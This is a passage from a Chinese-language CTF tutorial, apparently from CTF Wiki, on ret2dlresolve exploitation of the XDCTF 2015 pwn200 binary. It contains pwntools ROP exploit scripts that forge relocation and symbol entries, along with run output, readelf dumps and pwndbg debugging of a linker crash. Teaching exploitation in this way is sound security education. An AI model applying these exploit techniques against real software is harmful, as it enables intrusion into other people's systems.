<span class=n>write_reloc_offset</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>-</span> <span class=n>rel_plt</span>
<span class=n>write_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
<span class=n>r_info</span> <span class=o>=</span> <span class=mh>0x607</span>

<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>write_reloc_offset</span><span class=p>)</span>
<span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span>
<span class=c1># fake write args, write(1, base_stage+80, sh)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=c1># construct fake write relocation entry</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>write_got</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>r_info</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>这次我们在 base_stage+24 处伪造了一个 write 的重定位项，仍然输出了对应的字符串。</p> <div class=highlight><pre><span></span><code>❯ python stage3.py
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_32&#39;</span>: pid <span class=m>24506</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>10</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
/bin/sh<span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
</code></pre></div> <h5 id=stage-4>stage 4<a class=headerlink href=#stage-4 title="Permanent link">&para;</a></h5> <p>在 stage3 中，我们控制了重定位表项，但是伪造的重定位表项的内容仍然与 write 函数原来的重定位表项一致。</p> <p>在这个阶段中，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607&gt;&gt;8=0x6。因此，我们知道 write 对应的符号地址为 0x0804822c。</p> <div class=highlight><pre><span></span><code>❯ readelf -x .dynsym main_partial_relro_32

Hex dump of section <span class=s1>&#39;.dynsym&#39;</span>:
  0x080481cc <span class=m>00000000</span> <span class=m>00000000</span> <span class=m>00000000</span> <span class=m>00000000</span> ................
  0x080481dc <span class=m>33000000</span> <span class=m>00000000</span> <span class=m>00000000</span> <span class=m>12000000</span> <span class=m>3</span>...............
  0x080481ec <span class=m>27000000</span> <span class=m>00000000</span> <span class=m>00000000</span> <span class=m>12000000</span> <span class=err>&#39;</span>...............
  0x080481fc 5c000000 <span class=m>00000000</span> <span class=m>00000000</span> <span class=m>20000000</span> <span class=se>\.</span>.......... ...
  0x0804820c <span class=m>20000000</span> <span class=m>00000000</span> <span class=m>00000000</span> <span class=m>12000000</span>  ...............
  0x0804821c 3a000000 <span class=m>00000000</span> <span class=m>00000000</span> <span class=m>12000000</span> :...............
  0x0804822c 4c000000 <span class=m>00000000</span> <span class=m>00000000</span> <span class=m>12000000</span> L...............
  0x0804823c 1a000000 <span class=m>00000000</span> <span class=m>00000000</span> <span class=m>11000000</span> ................
  0x0804824c 2c000000 <span class=m>00000000</span> <span class=m>00000000</span> <span class=m>11000000</span> ,...............
  0x0804825c 0b000000 6c860408 <span class=m>04000000</span> <span class=m>11001000</span> ....l...........
</code></pre></div> <p>这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为 16 个字节。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>

<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span>
<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>

<span class=c1># stack privot to bss segment, set esp = base_stage</span>
<span class=n>stack_size</span> <span class=o>=</span> <span class=mh>0x800</span> <span class=c1># new stack size is 0x800</span>
<span class=n>base_stage</span> <span class=o>=</span> <span class=n>bss_addr</span> <span class=o>+</span> <span class=n>stack_size</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>offset</span><span class=p>)</span> <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>base_stage</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span> <span class=c1># read 100 byte to base_stage</span>
<span class=n>rop</span><span class=o>.</span><span class=n>migrate</span><span class=p>(</span><span class=n>base_stage</span><span class=p>)</span>
<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s1>&#39;./main_partial_relro_32&#39;</span><span class=p>)</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh&quot;</span>

<span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rel.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
<span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

<span class=c1># make a fake write symbol at base_stage + 32 + align</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>32</span>
<span class=n>align</span> <span class=o>=</span> <span class=mh>0x10</span> <span class=o>-</span> <span class=p>((</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xf</span>
                <span class=p>)</span>  <span class=c1># since the size of Elf32_Symbol is 0x10</span>
<span class=n>fake_sym_addr</span> <span class=o>=</span> <span class=n>fake_sym_addr</span> <span class=o>+</span> <span class=n>align</span>
<span class=n>index_dynsym</span> <span class=o>=</span> <span class=p>(</span><span class=n>fake_sym_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span> <span class=o>/</span> <span class=mh>0x10</span>  <span class=c1># calculate the dynsym index of write</span>
<span class=n>fake_write_sym</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=mh>0x4c</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>])</span>

<span class=c1># make fake write relocation at base_stage+24</span>
<span class=n>index_offset</span> <span class=o>=</span> <span class=n>base_stage</span> <span class=o>+</span> <span class=mi>24</span> <span class=o>-</span> <span class=n>rel_plt</span>
<span class=n>write_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>]</span>
<span class=n>r_info</span> <span class=o>=</span> <span class=p>(</span><span class=n>index_dynsym</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=mh>0x7</span> <span class=c1># calculate the r_info according to the index of write</span>
<span class=n>fake_write_reloc</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span><span class=n>write_got</span><span class=p>,</span> <span class=n>r_info</span><span class=p>])</span>

<span class=c1># construct rop chain</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>index_offset</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;bbbb&#39;</span><span class=p>)</span> <span class=c1># fake ret addr of write</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>base_stage</span> <span class=o>+</span> <span class=mi>80</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_reloc</span><span class=p>)</span>  <span class=c1># fake write reloc</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=n>align</span><span class=p>)</span>  <span class=c1># padding</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>fake_write_sym</span><span class=p>)</span>  <span class=c1># fake write symbol</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>80</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>sh</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>100</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>

<span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>直接执行后发现并不行</p> <div class=highlight><pre><span></span><code>❯ python stage4.py
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_32&#39;</span>: pid <span class=m>27370</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>10</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_32&#39;</span>
<span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
<span class=o>[</span>*<span class=o>]</span> Got EOF <span class=k>while</span> reading in interactive
</code></pre></div> <p>发现程序已经崩溃了，通过 coredump，可以发现程序在 <code>ld-linux.so.2</code> 中崩了。</p> <div class=highlight><pre><span></span><code> ► 0xf7f77fed    mov    ebx, dword ptr [edx + 4]
   0xf7f77ff0    test   ebx, ebx
   0xf7f77ff2    mov    ebx, 0
   0xf7f77ff7    cmove  edx, ebx
   0xf7f77ffa    mov    esi, dword ptr gs:[0xc]
   0xf7f78001    test   esi, esi
   0xf7f78003    mov    ebx, 1
   0xf7f78008    jne    0xf7f78078 &lt;0xf7f78078&gt;
    ↓
   0xf7f78078    mov    dword ptr gs:[0x1c], 1
   0xf7f78083    mov    ebx, 5
   0xf7f78088    jmp    0xf7f7800a &lt;0xf7f7800a&gt;
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0x804a7dc ◂— 0x0
... ↓
02:0008│      0x804a7e4 —▸ 0xf7f90000 ◂— 0x26f34
03:000c│      0x804a7e8 —▸ 0x804826c ◂— add    byte ptr [ecx + ebp*2 + 0x62], ch
04:0010│      0x804a7ec ◂— 0x0
... ↓
07:001c│      0x804a7f8 —▸ 0x804a84c ◂— 0x4c /* &#39;L&#39; */
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► f 0 f7f77fed
   f 1        0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x804a000 r-xp     2000 0      ./main_partial_relro_32
 0x8049000  0x804b000 rw-p     2000 0      [stack]
 0x804a000  0x804b000 rw-p     1000 1000   ./main_partial_relro_32
0xf7d6b000 0xf7f40000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc.so.6
0xf7f40000 0xf7f41000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f41000 0xf7f43000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f43000 0xf7f47000 rw-p     4000 1d7000 /lib/i386-linux-gnu/libc.so.6
0xf7f67000 0xf7f69000 r-xp     2000 0      [vdso]
0xf7f69000 0xf7f90000 r-xp    27000 0      [linker]
0xf7f69000 0xf7f90000 r-xp    27000 0      /lib/ld-linux.so.2
0xf7f90000 0xf7f91000 rw-p     1000 26000  [linker]
0xf7f90000 0xf7f91000 rw-p     1000 26000  /lib/ld-linux.so.2
</code></pre></div> <p>通过逆向分析 ld-linux.so.2 </p> <div class=highlight><pre><span></span><code>  <span class=k>if</span> <span class=p>(</span> <span class=n>v9</span> <span class=p>)</span>
  <span class=p>{</span>
    <span class=n>v10</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>a1</span><span class=p>[</span><span class=mi>92</span><span class=p>]</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=n>_WORD</span> <span class=o>*</span><span class=p>)(</span><span class=o>*</span><span class=p>((</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>v9</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>v4</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x7FFF</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span> <span class=o>!*</span><span class=p>((</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>v10</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>)</span>
      <span class=n>v10</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
  <span class=p>}</span>
</code></pre></div> <p>以及源码可以知道程序是在访问 version 的 hash 时出错。</p> <div class=highlight><pre><span></span><code>        <span class=k>if</span> <span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span>
        <span class=p>{</span>
            <span class=k>const</span> <span class=nf>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span> <span class=o>*</span><span class=n>vernum</span> <span class=o>=</span>
                <span class=p>(</span><span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>D_PTR</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]);</span>
            <span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span> <span class=n>ndx</span> <span class=o>=</span> <span class=n>vernum</span><span class=p>[</span><span class=n>ELFW</span><span class=p>(</span><span class=n>R_SYM</span><span class=p>)(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)]</span> <span class=o>&amp;</span> <span class=mh>0x7fff</span><span class=p>;</span>
            <span class=n>version</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_versions</span><span class=p>[</span><span class=n>ndx</span><span class=p>];</span>
            <span class=k>if</span> <span class=p>(</span><span class=n>version</span><span class=o>-&gt;</span><span class=n>hash</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
                <span class=n>version</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
        <span class=p>}</span>
</code></pre></div> <p>进一步分析可以知道，因为我们伪造了 write 函数的重定位表项，其中 reloc-&gt;r_info 被设置成了比较大的值（由于 index_dynsym 离符号表比较远）。这时候，ndx 的值并不可预期，进而 version 的值也不可预期，因此可能出现不可预期的情况。</p> <p>通过分析 .dynmic 节，我们可以发现 vernum 的地址为 0x80482d8。</p> <div class=highlight><pre><span></span><code>❯ readelf -d main_partial_relro_32

Dynamic section at offset 0xf0c contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x804834c
 0x0000000d (FINI)                       0x8048654
 0x00000019 (INIT_ARRAY)                 0x8049f04
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f08
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804826c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      107 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048324
 0x00000011 (REL)                        0x804830c
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482ec
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482d8
 0x00000000 (NULL)                       0x0
</code></pre></div> <p>在 ida 中，我们也可以看到相关的信息</p> <div class=highlight><pre><span></span><code>LOAD:080482D8 ; ELF GNU Symbol Version Table
LOAD:080482D8                 dw 0
LOAD:080482DA                 dw 2                    ; setbuf@@GLIBC_2.0
LOAD:080482DC                 dw 2                    ; read@@GLIBC_2.0
LOAD:080482DE                 dw 0                    ; local  symbol: __gmon_start__
LOAD:080482E0                 dw 2                    ; strlen@@GLIBC_2.0
LOAD:080482E2                 dw 2                    ; __libc_start_main@@GLIBC_2.0
LOAD:080482E4                 dw 2                    ; write@@GLIBC_2.0
LOAD:080482E6                 dw 2                    ; stdin@@GLIBC_2.0
LOAD:080482E8                 dw 2                    ; stdout@@GLIBC_2.0
LOAD:080482EA                 dw 1                    ; global symbol: _IO_stdin_used
</code></pre></div> <p>那我们可以再次运行看一下伪造后 ndx 具体的值</p> <div class=highlight><pre><span></span><code>❯ python stage4.py
<span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
<span class=o>[</span>+<span class=o>]</span> Starting <span class=nb>local</span> process <span class=s1>&#39;./main_partial_relro_32&#39;</span>: pid <span class=m>27649</span>
<span class=o>[</span>*<span class=o>]</span> Loaded <span class=m>10</span> cached gadgets <span class=k>for</span> <span class=s1>&#39;./main_partial_relro_32&#39;</span>
ndx_addr: 0x80487a8
</code></pre></div> <p>可以发现，ndx_落入了 <code>.eh_frame</code> 节中。</p> <div class=highlight><pre><span></span><code>.eh_frame:080487A8                 dw 442Ch
</code></pre></div> <p>进一步地，ndx 的值为 0x442C。显然不知道会索引到哪里去。</p> <div class=highlight><pre><span></span><code>        <span class=k>if</span> <span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span>
        <span class=p>{</span>
            <span class=k>const</span> <span class=nf>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span> <span class=o>*</span><span class=n>vernum</span> <span class=o>=</span>
                <span class=p>(</span><span class=k>const</span> <span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>D_PTR</span><span class=p>(</span><span class=n>l</span><span class=p>,</span> <span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]);</span>
            <span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span> <span class=n>ndx</span> <span class=o>=</span> <span class=n>vernum</span><span class=p>[</span><span class=n>ELFW</span><span class=p>(</span><span class=n>R_SYM</span><span class=p>)(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)]</span> <span class=o>&amp;</span> <span class=mh>0x7fff</span><span class=p>;</span>
            <span class=n>version</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_versions</span><span class=p>[</span><span class=n>ndx</span><span class=p>];</span>
            <span class=k>if</span> <span class=p>(</span><span class=n>version</span><span class=o>-&gt;</span><span class=n>hash</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
                <span class=n>version</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
        <span class=p>}</span>
</code></pre></div> <p>通过动态调试，我们可以发现 l_versions 的起始地址，并且其中一共有 3 个元素。</p> <div class=highlight><pre><span></span><code>pwndbg&gt; print *((struct link_map *)0xf7f0d940)
$4 = {
  l_addr = 0, 
  l_name = 0xf7f0dc2c &quot;&quot;, 
  l_ld = 0x8049f0c, 
  l_next = 0xf7f0dc30, 
  l_prev = 0x0, 
  l_real = 0xf7f0d940, 
  l_ns = 0, 
  l_libname = 0xf7f0dc20, 
  l_info = {0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 &lt;repeats 13 times&gt;, 0x8049fbc, 0x0 &lt;repeats 25 times&gt;, 0x8049f44}, 
  l_phdr = 0x8048034, 
  l_entry = 134513632, 
  l_phnum = 9, 
  l_ldnum = 0, 
  l_searchlist = {
    r_list = 0xf7edf3e0, 
    r_nlist = 3
  }, 
  l_symbolic_searchlist = {
    r_list = 0xf7f0dc1c, 
    r_nlist = 0
  }, 
  l_loader = 0x0, 
  l_versions = 0xf7edf3f0, 
  l_nversions = 3, 
</code></pre></div> <p>对应的分别为 </p> <div class=highlight><pre><span></span><code>pwndbg&gt; print *((struct r_found_version[3] *)0xf7edf3f0)
$13 = {{
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x80482be &quot;GLIBC_2.0&quot;, 
    hash = 225011984, 
    hidden = 0, 
    filename = 0x804826d &quot;libc.so.6&quot;
  }}
</code></pre></div> <p>此时，计算得到的 version 地址为 0xf7f236b0，显然不在映射的内存区域。</p> <div class=highlight><pre><span></span><code>pwndbg&gt; print /x 0xf7edf3f0+0x442C*16
$16 = 0xf7f236b0
pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x804a000  0x804b000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
0xf7ce8000 0xf7ebd000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7ebd000 0xf7ebe000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ebe000 0xf7ec0000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec0000 0xf7ec1000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ec1000 0xf7ec4000 rw-p     3000 0      
0xf7edf000 0xf7ee1000 rw-p     2000 0      
0xf7ee1000 0xf7ee4000 r--p     3000 0      [vvar]
0xf7ee4000 0xf7ee6000 r-xp     2000 0      [vdso]
0xf7ee6000 0xf7f0c000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so
0xf7f0c000 0xf7f0d000 r--p     1000 25000  /lib/i386-linux-gnu/ld-2.27.so
0xf7f0d000 0xf7f0e000 rw-p     1000 26000  /lib/i386-linux-gnu/ld-2.27.so
0xffa4b000 0xffa6d000 rw-p    22000 0      [stack]
